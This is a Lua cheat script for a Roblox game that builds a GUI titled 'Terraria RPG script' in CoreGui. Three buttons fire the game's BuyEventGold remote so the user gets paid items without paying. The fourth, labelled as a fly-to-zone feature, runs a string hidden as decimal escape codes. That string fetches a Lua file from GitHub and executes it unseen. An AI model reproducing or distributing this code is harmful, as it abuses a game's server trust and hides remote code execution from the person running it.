-- Gui to Lua
-- Version: 3.2

-- Instances:

local ScreenGui = Instance.new("ScreenGui")
local Main = Instance.new("Frame")
local Name = Instance.new("TextLabel")
local Catlass = Instance.new("TextButton")
local XL = Instance.new("TextButton")
local Aztec = Instance.new("TextButton")
local Grinder = Instance.new("TextButton")

--Properties:

ScreenGui.Parent = game.CoreGui

Main.Name = "Main"
Main.Parent = ScreenGui
Main.BackgroundColor3 = Color3.fromRGB(66, 69, 73)
Main.BorderSizePixel = 5
Main.Position = UDim2.new(0.0785758123, 0, 0.230769232, 0)
Main.Size = UDim2.new(0, 608, 0, 301)
Main.Active = true
Main.Draggable = true

Name.Name = "Name"
Name.Parent = Main
Name.BackgroundColor3 = Color3.fromRGB(66, 69, 73)
Name.BorderColor3 = Color3.fromRGB(0, 0, 0)
Name.BorderSizePixel = 5
Name.Position = UDim2.new(0, 0, -0.163398698, 0)
Name.Size = UDim2.new(0, 608, 0, 50)
Name.Font = Enum.Font.Unknown
Name.Text = "Terraria RPG script"
Name.TextColor3 = Color3.fromRGB(0, 0, 0)
Name.TextScaled = true
Name.TextSize = 14.000
Name.TextWrapped = true

Catlass.Name = "Catlass"
Catlass.Parent = Main
Catlass.BackgroundColor3 = Color3.fromRGB(107, 255, 105)
Catlass.BorderColor3 = Color3.fromRGB(0, 0, 0)
Catlass.BorderSizePixel = 0
Catlass.Position = UDim2.new(0.0213815831, 0, 0.0863787457, 0)
Catlass.Size = UDim2.new(0, 125, 0, 75)
Catlass.Font = Enum.Font.Unknown
Catlass.Text = "Give Yourself Catlass"
Catlass.TextColor3 = Color3.fromRGB(0, 0, 0)
Catlass.TextScaled = true
Catlass.TextSize = 14.000
Catlass.TextWrapped = true
Catlass.MouseButton1Down:Connect(function()
	local args = {
		[1] = "Catlass"
	}

	game:GetService("ReplicatedStorage").GameRemotes.BuyEventGold:FireServer(unpack(args))
end)

XL.Name = "XL"
XL.Parent = Main
XL.BackgroundColor3 = Color3.fromRGB(107, 255, 105)
XL.BorderColor3 = Color3.fromRGB(0, 0, 0)
XL.BorderSizePixel = 0
XL.Position = UDim2.new(0.274671048, 0, 0.0863787457, 0)
XL.Size = UDim2.new(0, 125, 0, 75)
XL.Font = Enum.Font.Unknown
XL.Text = "Give Yourself XL"
XL.TextColor3 = Color3.fromRGB(0, 0, 0)
XL.TextScaled = true
XL.TextSize = 14.000
XL.TextWrapped = true
XL.MouseButton1Down:Connect(function()
	local args = {
		[1] = "The XL"
	}

	game:GetService("ReplicatedStorage").GameRemotes.BuyEventGold:FireServer(unpack(args))
end)

Aztec.Name = "Aztec"
Aztec.Parent = Main
Aztec.BackgroundColor3 = Color3.fromRGB(107, 255, 105)
Aztec.BorderColor3 = Color3.fromRGB(0, 0, 0)
Aztec.BorderSizePixel = 0
Aztec.Position = UDim2.new(0.527960539, 0, 0.0863787457, 0)
Aztec.Size = UDim2.new(0, 125, 0, 75)
Aztec.Font = Enum.Font.Unknown
Aztec.Text = "Give Yourself Aztec"
Aztec.TextColor3 = Color3.fromRGB(0, 0, 0)
Aztec.TextScaled = true
Aztec.TextSize = 14.000
Aztec.TextWrapped = true
Aztec.MouseButton1Down:Connect(function()
	local args = {
		[1] = "Aztec"
	}

	game:GetService("ReplicatedStorage").GameRemotes.BuyEventGold:FireServer(unpack(args))
end)

Grinder.Name = "Grinder"
Grinder.Parent = Main
Grinder.BackgroundColor3 = Color3.fromRGB(107, 255, 105)
Grinder.BorderColor3 = Color3.fromRGB(0, 0, 0)
Grinder.BorderSizePixel = 0
Grinder.Position = UDim2.new(0.776315808, 0, 0.0863787457, 0)
Grinder.Size = UDim2.new(0, 125, 0, 75)
Grinder.Font = Enum.Font.Unknown
Grinder.Text = "CFrame Fly To Grinding Zone"
Grinder.TextColor3 = Color3.fromRGB(0, 0, 0)
Grinder.TextScaled = true
Grinder.TextSize = 14.000
Grinder.TextWrapped = true
Grinder.MouseButton1Down:Connect(function()
	loadstring("\108\111\97\100\115\116\114\105\110\103\40\103\97\109\101\58\72\116\116\112\71\101\116\40\39\104\116\116\112\115\58\47\47\114\97\119\46\103\105\116\104\117\98\117\115\101\114\99\111\110\116\101\110\116\46\99\111\109\47\67\114\48\115\53\72\51\52\68\47\114\111\98\108\111\120\45\115\99\114\105\112\116\115\47\109\97\105\110\47\84\101\108\101\112\111\114\116\105\110\103\46\108\117\97\39\41\41\40\41\10")()
end)
